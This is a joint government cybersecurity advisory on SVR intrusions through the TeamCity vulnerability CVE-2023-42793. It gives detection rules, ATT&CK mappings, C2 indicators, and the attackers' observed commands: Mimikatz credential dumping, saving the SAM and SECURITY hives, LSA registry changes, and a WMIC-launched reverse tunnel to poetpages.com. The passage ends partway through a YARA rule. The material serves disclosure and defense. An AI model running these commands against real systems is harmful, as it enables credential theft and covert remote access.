For a downloadable copy of IOCs, see:


AA23-347A STIX XML
(XML,       76.99 KB
  )




AA23-347A STIX JSON
(JSON,       69.29 KB
  )


THREAT OVERVIEW
SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.
A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.
Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.
In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.
Initial Access - Exploitation
The SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.
Host Reconnaissance
Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance [T1033],[T1059.003],[T1592.002]:

whoami /priv
whoami /all
whoami /groups
whoami /domain
nltest -dclist
nltest -dsgetdc
tasklist
netstat
wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief
wmic /node:""""<redacted>"""" process list brief
wmic process get commandline -all
wmic process <proc_id> get commandline
wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All

File Exfiltration
Additionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may provide insight into the host system’s operating system:

C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.
SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:

C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll


Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:

C:\Program Files (x86)\Microsoft Visual Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:

C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf





Interest in SQL Server
Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server [T1059.001],[T1505.001]:

powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll"" -DestinationPath C:\Windows\temp\1\sql.zip
SVR cyber actors also exfiltrated secforwarder.dll

Tactics Used to Avoid Detection
To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].
This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].
In several cases SVR attempted to hide their backdoors via:

Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,
Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,
Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.

To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated below:

 


Privilege Escalation
To facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.
The SVR modified the NoLMHash registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d ""0"" /f

The SVR used the following Mimikatz commands [T1003]:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Persistence
The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:

C:\Windows\temp
C:\Windows\System32
C:\Windows\WinStore

The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of Compromise.
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs) [T1558.001].
Sensitive Data Exfiltration [T1020]
The SVR exfiltrated the following Windows Registry hives from its victims [T1003]:

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY

In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\ directory.

reg save HKLM\SYSTEM """"C:\Windows\temp\1\sy.sa"""" /y
reg save HKLM\SAM """"C:\Windows\temp\1\sam.sa"""" /y
reg save HKLM\SECURITY """"C:\Windows\temp\1\se.sa"""" /y
powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q

In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.
SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.
Network Reconnaissance
After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [T1046]. The SVR executed the following PowerSploit commands:

Get-NetComputer
Get-NetGroup
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""
Get-NetDiDomain
Get-AdUser
Get-DomainUser -UserName
Get-NetUser -PreauthNotRequire
Get-NetComputer | select samaccountname
Get-NetUser -SPN | select serviceprincipalname

Tunneling into Compromised Environments
In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure [T1572].
The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:

65.20.97[.]203:443
Poetpages[.]com:8443

The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [T1047] utility after dropping it to disk:

wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""

Lateral Movement
The SVR used WMIC to facilitate lateral movement [T1047],[T1210].

wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create """"rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""""

The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].
It modified Registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d ""0"" /f

Adversary Toolset
In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:

GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [T1027.001] to exchange data with the SVR operator.
After execution, GraphicalProton gathers environment information such as active TCP/UDP connections [T1049], running processes [T1049], as well as user, host, and domain names [T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel [T1567]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results [T1564.001]. Directory name is re-randomized each time the GraphicalProton process is started.
BMP files that were used to exchange data were generated in the following way:


Compress data using zlib,
Encrypt data using custom algorithm,
Add “***” string literal to encrypted data,
Create a random BMP with random rectangle,
And finally, encode encrypted data within lower pixel bits.

While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf [T1036], an open-source C++ build analysis tool from Microsoft.

GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.


MITRE ATT&CK TACTICS AND TECHNIQUES
See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.

Table 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance


Technique Title
ID
Use




Gather Victim Network Information: Network Topology
T1590.004
SVR cyber actors may gather information about the victim’s network topology that can be used during targeting.


Gather Victim Host Information: Software
T1592.002
SVR cyber actors may gather information about the victim’s host networks that can be used during targeting.




Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access.




Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: PowerShell
T1059.001
SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files.


Command and Scripting Interpreter: Windows Command Shell
T1059.003

SVR cyber actors execute these powershell commands to perform host reconnaissance:

powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties
powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All




Exploitation for Client Execution
T1203
SVR cyber actors leverage arbitrary code execution after exploiting CVE-2023-42793.


Hijack Execution Flow: DLL Side-Loading
T1574.002
SVR cyber actors use a variant of GraphicalProton that uses DLL hijacking in Zabbix as a means to start execution.




Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence


Technique Title
ID
Use




Scheduled Task
T1053.005
SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code.


Server Software Component: SQL Stored Procedures
T1505.001
SVR cyber actors abuse SQL server stored procedures to maintain persistence.


Boot or Logon Autostart Execution
T1547
SVR cyber actors used C:\Windows\system32\ntoskrnl.exe to configure automatic system boot settings to maintain persistence.




Table 5: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Privilege Escalation


Technique Title
ID
Use




Exploitation for Privilege Escalation
T1068

SVR cyber actors exploit JetBrains TeamCity vulnerability to achieve escalated privileges.
To avoid detection, the SVR cyber actors used a “Bring Your Own Vulnerable Driver”  technique to disable EDR and AV defense mechanisms.



Account Manipulation
T1098
SVR cyber actors may manipulate accounts to maintain and/or elevate access to victim systems.




Table 6: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Defense Evasion


Technique Title
ID
Use




Obfuscated Files or Information: Binary Padding
T1027.001
SVR cyber actors use BMPs to perform binary padding while exchange data is exfiltrated to an their C2 station.


Masquerading
T1036
SVR cyber actors use a variant that uses DLL hijacking in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.


Process Injection
T1055
SVR cyber actors inject code into AV and EDR processes to evade defenses.


Disable or Modify Tools
T1562.001
SVR cyber actors may modify and/or disable tools to avoid possible detection of their malware/tools and activities.


Hide Artifacts
T1564
SVR cyber actors may attempt to hide artifacts associated with their behaviors to evade detection.


Hide Artifacts: Hidden Files and Directories
T1564.001
When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results.




Table 7: SVR Cyber actors’ ATT&CK Techniques for Enterprise: Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
SVR cyber actors executed Mimikatz commands in memory to gain access to credentials stored in memory.


OS Credential Dumping: Security Account Manager
T1003.002

SVR cyber actors used:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Mimikatz commands to gain access to credentials.
Additionally, SVR cyber actors exfiltrated Windows registry hives to steal credentials.

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY




Credentials from Password Stores: Credentials from Web Browsers
T1555.003
In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.


Steal or Forge Kerberos Tickets: Golden Ticket
T1558.001
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs).




Table 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery


Technique Title
ID
Use




System Owner/User Discovery
T1033
SVR cyber actors use these built-in commands to perform host reconnaissance: whoami /priv, whoami / all, whoami / groups, whoami / domain to perform user discovery.


Network Service Discovery
T1046
SVR cyber actors performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit.


Process Discovery
T1057
SVR cyber actors use GraphicalProton to gather running processes data.


Gather Victim Network Information
T1590
SVR cyber actors use GraphicalProton to gather victim network information.




Table 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement


Technique Title
ID
Use




Exploitation of Remote Services
T1210
SVR cyber actors may exploit remote services to gain unauthorized access to internal systems once inside a network.


Windows Management Instrumentation
T1047

SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads.
wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""





Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control


Technique Title
ID
Use




Dynamic Resolution
T1568
SVR may dynamically establish connections to command-and-control infrastructure to evade common detections and remediations.


Protocol Tunneling
T1572

SVR cyber actors may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.
In selected environments, the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstunm—to establish a tunnel to the C2 infrastructure.





Table 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration


Technique Title
ID
Use




Automated Exfiltration
T1020
SVR cyber actors may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during collection.


Exfiltration Over C2 Channel
T1041
SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications.


Exfiltration Over Web Service
T1567
SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station.



INDICATORS OF COMPROMISE
Note: Please refer to Appendix B for a list of IOCs.
VICTIM TYPES
As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.
DETECTION METHODS
The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization’s environment and telemetry.
SIGMA Rules




title: Privilege information listing via whoamidescription: Detects whoami.exe execution and listing of privilegesauthor: references: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoamidate: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'whoami.exe'        CommandLine|contains:          - 'priv'          - 'PRIV'    condition: selectionfalsepositives: legitimate use by system administrator
title: DC listing via nltestdescription: Detects nltest.exe execution and DC listingauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'nltest.exe'        CommandLine|re: '.*dclist\:.*|.*DCLIST\:.*|.*dsgetdc\:.*|.*DSGETDC\:.*'    condition: selectionfalsepositives: legitimate use by system administrator
title: DLL execution via WMIdescription: Detects DLL execution via WMIauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'WMIC.exe'        CommandLine|contains|all:          - 'call'          - 'rundll32'    condition: selectionfalsepositives: legitimate use by software or system administrator
title: Process with connect and pass as argsdescription: Process with connect and pass as argsauthor:references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        CommandLine|contains|all:          - 'pass'          - 'connect'    condition: selectionfalsepositives: legitimate use of rsockstun or software with exact same arguments
title: Service or Drive enumeration via powershelldescription: Service or Drive enumeration via powershell author: references:date: 2023/11/15logsource:    category: ps_script    product: windowsdetection:    selection_1:            ScriptBlockText|contains|all:            - 'Get-WmiObject'            - '-Class'            - 'Win32_Service'    selection_2:            ScriptBlockText|contains|all:            - 'Get-WindowsDriver'            - '-Online'            - '-All'    condition: selection_1 or selection_2falsepositives: legitimate use by system administrator
title: Compressing files from temp to tempdescription: Compressing files from temp\ to temp used by SVR to prepare data to be exfiltratedreferences:author: date: 2023/11/15logsource:    category: ps_script    product: windowsdetection:    selection:        ScriptBlockText|re: '.*Compress\-Archive.*Path.*Windows\\[Tt]{1}emp\\[1-9]{1}.*DestinationPath.*Windows\\[Tt]{1}emp\\.*'    condition: selection
title: DLL names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific DLL names.references:author: date: 2023/11/15logsource:    category: image_load    product: windowsdetection:    selection:        ImageLoaded|endswith:          - 'AclNumsInvertHost.dll'          - 'ModeBitmapNumericAnimate.dll'          - 'UnregisterAncestorAppendAuto.dll'          - 'DeregisterSeekUsers.dll'          - 'ScrollbarHandleGet.dll'          - 'PerformanceCaptionApi.dll'          - 'WowIcmpRemoveReg.dll'          - 'BlendMonitorStringBuild.dll'          - 'HandleFrequencyAll.dll'          - 'HardSwapColor.dll'          - 'LengthInMemoryActivate.dll'          - 'ParametersNamesPopup.dll'          - 'ModeFolderSignMove.dll'          - 'ChildPaletteConnected.dll'          - 'AddressResourcesSpec.dll'    condition: selection
title: Sensitive registry entries saved to filedescription: Sensitive registry entries saved to fileauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection_base:        Image|endswith:          - 'reg.exe'        CommandLine|contains: 'save'        CommandLine|re: '.*HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*'    selection_file:      CommandLine|re: '.*sy\.sa.*|.*sam\.sa.*|.*se\.sa.*'    condition: selection_base and selection_file
title: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor: references: date: 2023/11/15logsource:    category: taskscheduler    product: windowsdetection:    selection:        EventID:          - 4698          - 4699          - 4702        TaskName:          - '\Microsoft\Windows\IISUpdateService'          - '\Microsoft\Windows\WindowsDefenderService'          - '\Microsoft\Windows\WindowsDefenderService2'          - '\Microsoft\DefenderService'          - '\Microsoft\Windows\DefenderUPDService'          - '\Microsoft\Windows\WiMSDFS'          - '\Microsoft\Windows\Application Experience\StartupAppTaskCkeck'          - '\Microsoft\Windows\Windows Error Reporting\SubmitReporting'          - '\Microsoft\Windows\Windows Defender\Defender Update Service'          - '\WindowUpdate'          - '\Microsoft\Windows\Windows Error Reporting\CheckReporting'          - '\Microsoft\Windows\Application Experience\StartupAppTaskCheck'          - '\Microsoft\Windows\Speech\SpeechModelInstallTask'          - '\Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStart'          - '\Microsoft\Windows\Data Integrity Scan\Data Integrity Update'          - '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'          - '\Microsoft\Windows\ATPUpd'          - '\Microsoft\Windows\Windows Defender\Service Update'          - '\Microsoft\Windows\WindowsUpdate\Scheduled Check'          - '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'          - '\Defender'          - '\defender'          - '\\Microsoft\\Windows\\IISUpdateService'          - '\\Microsoft\\Windows\\WindowsDefenderService'          - '\\Microsoft\\Windows\\WindowsDefenderService2'          - '\\Microsoft\\DefenderService'          - '\\Microsoft\\Windows\\DefenderUPDService'          - '\\Microsoft\\Windows\\WiMSDFS'          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'          - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'          - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'          - '\\WindowUpdate'          - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'          - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'          - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'          - '\\Microsoft\\Windows\\Data Integrity Scan\Data Integrity Update'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'          - '\\Microsoft\\Windows\\ATPUpd'          - '\\Microsoft\\Windows\\Windows Defender\\Service Update'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'          - '\\Defender'          - '\\defender'    condition: selection
title: Scheduled tasks names used by SVR for GraphicalProton backdoordescription: Hunts for known SVR-specific scheduled task namesauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'schtasks.exe'        CommandLine|contains:          - 'IISUpdateService'          - 'WindowsDefenderService'          - 'WindowsDefenderService2'          - 'DefenderService'          - 'DefenderUPDService'          - 'WiMSDFS'          - 'StartupAppTaskCkeck'          - 'SubmitReporting'          - 'Defender Update Service'          - 'WindowUpdate'          - 'CheckReporting'          - 'StartupAppTaskCheck'          - 'SpeechModelInstallTask'          - 'BfeOnServiceStart'          - 'Data Integrity Update'          - 'Scheduled AutoCheck'          - 'ATPUpd'          - 'Service Update'          - 'Scheduled Check'          - 'Scheduled AutoCheck'          - 'Defender'          - 'defender'    selection_re:        Image|endswith:          - 'schtasks.exe'        CommandLine|re:          - '.*Defender\sUpdate\sService.*'          - '.*Data\sIntegrity\sUpdate.*'          - '.*Scheduled\sAutoCheck.*'          - '.*Service\sUpdate.*'          - '.*Scheduled\sCheck.*'          - '.*Scheduled\sAutoCheck.*'    condition: selection or selection_re
title: Suspicious registry modificationsdescription: Suspicious registry modificationsauthor: references:date: 2023/11/15logsource:    category: registry_set    product: windowsdetection:    selection:        EventID: 4657        TargetObject|contains:          - 'CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin'          - 'CurrentControlSet\\Control\\Lsa\\NoLMHash'    condition: selection
title: Registry modification from cmddescription: Registry modification from cmdauthor: references:date: 2023/11/15logsource:    category: process_creation    product: windowsdetection:    selection:        Image|endswith:          - 'reg.exe'        CommandLine|contains|all:          - 'CurrentControlSet'          - 'Lsa'        CommandLine|contains:          - 'DisableRestrictedAdmin'          - 'NoLMHash'    condition: selection
title: Malicious Driver Loaddescription: Detects the load of known malicious drivers via their names or hash.references:    - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detectionauthor: date: 2023/11/15logsource:    category: driver_load    product: windowsdetection:    selection_name:        ImageLoaded|endswith:            - 'RTCore64.sys'            - 'DBUtils_2_3.sys'    selection_hash:        Hashes|contains:            - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'            - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'    condition: selection_name or selection_hash




YARA rules
The following rule detects most known GraphicalProton variants.




rule APT29_GraphicalProton {    strings:        // C1 E9 1B                                shr     ecx, 1Bh        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]        // 8B 50 04                                mov     edx, [rax+4]        // C1 E2 05                                shl     edx, 5        // 09 D1                                   or      ecx, edx        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]        $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }
        // 48 05 20 00 00 00                       add     rax, 20h ; ' '        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 0A A6 0D 00                    lea     rdx, unk_14011E546        // 41 B8 30 00 00 00                       mov     r8d, 30h ; '0'        // E8 69 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 40 00 00 00                       add     rax, 40h ; '@'        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 1B A6 0D 00                    lea     rdx, unk_14011E577        // 41 B8 70 01 00 00                       mov     r8d, 170h        // E8 49 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 60 00 00 00                       add     rax, 60h ; '`'        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 6C A7 0D 00                    lea     rdx, unk_14011E6E8        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'        // E8 29 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 80 00 00 00                       add     rax, 80h        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 7C A7 0D 00                    lea     rdx, unk_14011E718        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'        // E8 09 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 A0 00 00 00                       add     rax, 0A0h        $op_decrypt_config = {            48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 